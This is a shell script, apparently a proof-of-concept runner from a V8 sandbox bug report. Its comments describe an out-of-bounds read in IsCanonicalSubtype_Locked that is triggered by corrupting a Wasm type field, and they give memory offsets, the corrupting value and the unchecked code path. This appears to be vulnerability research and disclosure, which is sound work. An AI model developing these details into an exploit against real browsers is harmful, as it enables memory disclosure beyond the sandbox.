#!/bin/sh
# PoC runner: IsCanonicalSubtype_Locked OOB read via in-sandbox write
#
# WHAT:
#   1. Creates a Wasm struct type and instantiates it
#   2. Uses --sandbox-testing Sandbox API to navigate:
#        WasmStruct → Map (+0) → WasmTypeInfo (+20) → canonical_type_ (+4)
#   3. Corrupts canonical_type_ PayloadField[9:29] from valid index → 0x1FFFFF
#   4. Calls a Wasm function that expects the struct type, triggering:
#        JSToWasmObject → IsCanonicalSubtype → IsCanonicalSubtype_Locked
#          → canonical_supertypes_[0x1FFFFF]  ← OOB (vector in malloc, outside sandbox)
#
# EXPECTED OUTPUT (this binary — libc++ HARDENED MODE):
#   vector.h:419: libc++ Hardening assertion __n < size() failed: vector[] index out of bounds
#   Caught harmless signal (SIGABRT). Exiting process...
#
#   "Harmless" = the sandbox testing harness intercepted the signal.
#   The libc++ hardened check fires BEFORE the actual OOB read; in a non-hardened
#   Release build (production Chrome), the access would read malloc memory
#   outside the sandbox VA at canonical_supertypes_.data()[2097151].
#
# NOTE: The absence of SBXCHECK in the WasmTypeInfo branch of JSToWasmObject
#       (src/wasm/wasm-objects.cc:3381) means this is a sandbox violation:
#       an in-sandbox attacker can reach out-of-sandbox malloc memory.

D8=${D8:-/tmp/d8_build_mca/d8}
SCRIPT=$(dirname "$0")/poc_iscanonical.js

exec "$D8" --sandbox-testing --allow-natives-syntax \
     --wasm-staging \
     "$SCRIPT" "$@"
